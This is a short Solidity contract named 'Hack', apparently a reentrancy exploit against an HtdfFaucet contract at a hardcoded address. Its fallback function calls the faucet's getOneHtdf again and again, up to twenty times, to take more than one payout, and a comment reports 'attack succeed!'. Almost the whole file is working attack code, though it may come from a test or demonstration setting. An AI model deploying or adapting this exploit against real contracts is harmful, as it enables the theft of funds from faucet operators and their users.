// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import "./HtdfFaucet.sol";

contract Hack {

    HtdfFaucet public faucet;
    uint256 public stackDepth = 0;
    address public addr;
    address public owner;
    uint256 MAX_DEPTH = 20;

    event Depth(uint256 indexed d);

    constructor(){
    	// 此处也可以由构造函数参数传入
        addr = address(0x6E6701cA7a1a0a9C4d48Ce0CA50EcdEA838fED5f);
        faucet = HtdfFaucet(addr);
        owner = msg.sender;
    }

    // test pass, attack succeed!
    function  doHack() public {
        stackDepth = 0;
        emit Depth(stackDepth);
        faucet.getOneHtdf();
    }
    
    function clear() public{
        faucet.clearRecords();
    }

    // fallback function
    fallback() external {
        stackDepth += 1;
        emit Depth(stackDepth);
        if(stackDepth <= MAX_DEPTH) {
            faucet.getOneHtdf();
        }
    }

}